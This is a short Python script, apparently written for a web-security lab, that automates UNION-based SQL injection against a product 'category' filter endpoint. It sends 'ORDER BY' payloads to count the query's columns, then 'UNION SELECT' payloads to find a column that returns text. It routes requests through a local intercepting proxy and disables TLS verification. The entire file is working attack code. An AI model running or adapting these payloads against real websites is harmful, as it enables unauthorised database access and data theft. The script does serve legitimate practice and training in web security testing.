import sys
import urllib3
import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

def sql_attack(url):
    path = "filter?category=Accessories"
    for i in range(1,50):
        sqli_payload = "'+order+by+%s--" %i
        r = requests.get(url+path+sqli_payload, verify=False,proxies=proxies)
        res = r.text
        if "Internal Server Error" in res:
            return i - 1
        i+=1
    return False

def find_column_contains_text(url, no_columns):
    path = "filter?category=Accessories"
    for col in range(no_columns):
        columns = ["NULL"] * no_columns #create array of 3 elements ['NULL', 'NULL', 'NULL']
        columns[col] = "'Yp1YpZ'" # sub with a char in every position ["'a'", 'NULL', 'NULL']

        sqli_payload = "'+UNION+SELECT+"+','.join(columns)+'--'  # ' UNION SELECT 'a', NULL,NULL--
        req = requests.get(url+path+sqli_payload, verify=False, proxies=proxies)
        res = req.text
        if "Internal Server Error" in res:
            col+=1
        else:
            return col+1 # (range is zero indexed, we want 1-based)
    return False

if __name__ == '__main__':
    try:
        url= sys.argv[1].strip()
    except IndexError:
        print("[-] Usage:%s <url>" % sys.argv[0])
        print("[-] Example:%s www.example.com" %sys.argv[0])
        sys.exit(-1)

    print("[+] Figuring out the number of columns..")
    num_columns = sql_attack(url)
    if num_columns:
        print("[+] The number of columns is %s" %num_columns)

        print("[+] Finding the column that can hold text...")
        text_column = find_column_contains_text(url, num_columns)
        if text_column:
            print("[+] The column that can hold text is column %s" %text_column)
        else:
            print("[-] Could not find a column that accepts text.")
    else:
        print("[-] SQL injection attack was not successful.")
    
